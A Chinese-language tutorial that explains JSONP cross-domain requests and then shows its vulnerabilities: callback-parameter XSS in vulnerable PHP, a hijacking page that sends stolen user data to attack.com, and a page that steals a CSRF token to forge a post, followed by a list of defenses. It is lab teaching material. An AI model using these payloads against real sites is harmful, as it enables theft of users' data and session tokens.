# JSONP

## 介绍

jsonp是一种协议，准确的说，他是json的一种使用模式，为了解决Json受同源策略限制的问题。

## **基本语法**

JSONP的基本语法为：callback({“name”:”test”, “msg”:”success”})

常见的例子包括函数调用（如callback({“a”:”b”})）或变量赋值（var a={JSON data}）。

## 应用场景

### json

假设在192.168.7.166下放了一个test.json

    
    
    { username: "Sentiment", password: "123456" }

这时192.168.7.166下的html文件需要发送AJAX请求去访问这个test.json文件

    
    
    <script src='./jquery.js'></script>
    <script >
     $.ajax({
     url: 'http://192.168.7.166/test.json',
     type:"get",     
     dataType: "json",
     success: function (data) {
      console.log(data);}
     })
    </script>
    

此时该HTML文件和test.json同域，所以HTML文件能够正常获取json文件的内容。

![](./img/4846502806159041009.png)  
若将test.json放到192.168.43.136下，HTML与test.json不同域，这时去访问jsonp.html，发现受同源策略限制被拒绝

![](./img/3217358653776967186.png)  
这时就需要用到jsonp来解决这个问题

### jsonp

jsonp简单地说，就是利用script标签的src属性能够发起跨域请求的原理来实现的。

因此只需将`test.json`中的内容按照javascript规范去规定，便可以实现跨域资源访问。聪明的程序员们很快便找到了解决问题的办法。只需让目标页面回调本地页面的方法，并带入参数即可，这也就是`jsonp`的核心原理。

    
    
    <body>
    <script>
        function callback(data){
            alert("name:"+data.username+"  passwrod:"+data.password);
        }
    </script>
    <script src="http://192.168.43.136/test.json"></script>
    </body>
    

在test.json中按照`javascript`代码规范调用`callback`函数，并将数据作为参数传入

    
    
    callback({ username: "Sentim", password: "123456" })
    

此时请求jsonp.html，成功请求跨域json

![](./img/4149420201835079717.png)

# JSONP跨域漏洞

JSONP跨域漏洞主要是callback自定义导致的XSS和JSONP劫持。

### callback自定义导致的XSS

我们知道，在JSONP跨域中，我们是可以传入一个函数名的参数如callback，然后JSONP端点会根据我们的传参动态生成JSONP数据响应回来。

如果JSONP端点对于用于传入的函数名参数callback处理不当，如未正确设置响应包的Content-Type、未对用户输入参数进行有效过滤或转义时，就会导致XSS漏洞的产生。

jsonp.php

    
    
    <?php
    if(isset($_GET['callback'])){
        $callback = $_GET['callback'];
        print $callback.'({"username" : "Sentiment", "password" : "123456"});';
    } else {
        echo 'No callback param.';
    }
    ?>
    

请求后触发xss，此时发现php默认的content-type为text/html

![](./img/3546769813167844552.png)  
起初使用Java部署了这个环境，但由于未对Servlet容器的content-type进行默认设置，默认为null，导致没有弹窗

#### 其它content-type类型

经测试后发现application/json、text/json、application/javascript、text/javascript等都不触发XSS

### JSONP劫持

因为`jsonp`实现了跨域资源访问，如果获取的数据能够成为下一步操作的凭证，那么便可以引起jsonp劫持。

#### Demo1— 窃取用户信息

设置模拟用户登录页面 login.php

    
    
    <?php
    error_reporting(0);
    session_start();
    $name = $_GET['name'];
    $pwd = $_GET['pwd'];
    if($name==='admin' && $pwd === 'admin' || $name==='guest' && $pwd === 'guest'){
        $_SESSION['name'] = $name;
    }
    if (isset($_GET['logout'])) {
        if ($_GET['logout'] === '1') {
            unset($_SESSION['name']);
        }
    }
    echo '<a href="http://victim.com/info.php?callback=jsonp">用户信息</a><br>';
    echo '<a href="http://victim.com/main.php?logout=1">退出登录</a><br data-tomark-pass>';
    if(!$_SESSION['name']){
        echo '<html>
       <head>
          <title>登录</title>
          <meta charset="utf-8">
       </head>
       <body>
          <form action="login.php" method="get">
             用户名：<input type="text" name="name">
             密码：<input type="password" name="pwd">
             <input type="submit" name="submit" value="login">
          </form>
       </body>
       </html>';
    }else{
        echo "欢迎您, ".$_SESSION['name']."<br data-tomark-pass>";
    }
    ?>
    

查询信息页面

info.php

    
    
    <?php
    header('Content-type: application/json');
    error_reporting(0);
    session_start();
    $callback = $_GET['callback'];
    if($_SESSION['name'] === 'admin'){
            echo $callback."({'id':1,'name':'Sentiment'})";
    } elseif($_SESSION['name'] === 'guest') {
            echo $callback."({'id':2,'name':'guest'})";
    } else {
            echo $callback."获取个人信息失败";
    }
    ?>
    

当用户登录后，访问info.php便能查询到自己的信息，此时构造恶意html

    
    
    <html>
    <head>
        <title>lol</title>
        <meta charset="utf-8">
    </head>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        function jsonp_hack(v){
            alert("JSONP hijacking");
            var h = '';
            for(var key in v){
                var a = '';
                a = key + ' : ' + v[key] + ' ,';
                h += a;
            }
            alert(h);
            $.get('http://attack.com/index.html?value='+h);
        }
    </script>
    <script src="http://victim.com/info.php?callback=jsonp_hack"></script>
    <body>
        <h1>Welcome</h1>
    </body>
    </html>
    

引导用户访问后成功被jsonp劫持

![](./img/6444144950635515954.png)

#### Demo2— 劫持token

下面的示例模拟通过JSONP劫持窃取token来发表文章的情形。

add_article.php，放置于目标服务器中，功能是发表文章，前提是token值成功校验通过：

    
    
    <?php
    if(!empty($_POST['token'])){
        $csrf_token = $_POST['token'];
        $title = $_POST['title'];
        $content = $_POST['content'];
        if ($csrf_token === 'jsonp_test')
        {
            echo '文章发表成功~'.'</br>';
            echo $title.'</br>';
            echo $content;
        }
        else
        {
            echo 'csrf token error';
        }
    }
    else
    {
        echo 'no token';
    }
    ?>
    

token.php

    
    
    <?php
    header('Content-type: application/json');
    if(isset($_GET['callback'])){
        $callback = $_GET['callback'];
        print $callback.'({"username" : "Sentiment", "password" : "123456", "token" : "jsonp_test"});';
    } else {
        echo 'No callback param.';
    }
    ?>
    

attack.html，攻击者用于诱使用户访问的文件，放置于攻击者服务器中，用于访问目标JSONP端点获取token之后，再带上该token向目标服务器的add_article.php发起请求来发表文章：

    
    
    <html>
    <head>
    <title>JSONP Hijacking</title>
    <meta charset="utf-8">
    </head>
    <body>
    <form action="http://victim.com/add_article.php" method="POST" id="csrfsend">
    <input type="hidden" name="content" value="Hacked by Sentiment!">
    <input type="hidden" name="title" value="Oops!">
    <input type="hidden" id="token" name="token" value="">
    </form>
    <script type="text/javascript">
    function exp(obj){
        console.log(obj);
        var token = obj["token"];
        document.getElementById("token").value = token;
        document.getElementById("csrfsend").submit();
    }
    </script>
    <script type="text/javascript" src="http://victim.com/token.php?callback=exp"></script>
    </body>
    </html>
    

引导用户访问后成功劫持token

![](./img/6174473695367258223.png)

# 防御

  * 若可行，则使用CORS替换JSONP实现跨域功能；
  * 应用CSRF防御措施来调用JSON文件：限制Referer 、部署Token等；
  * 严格设置Content-Type及编码（Content-Type: application/json; charset=utf-8 ）；
  * 把回调函数加入到白名单

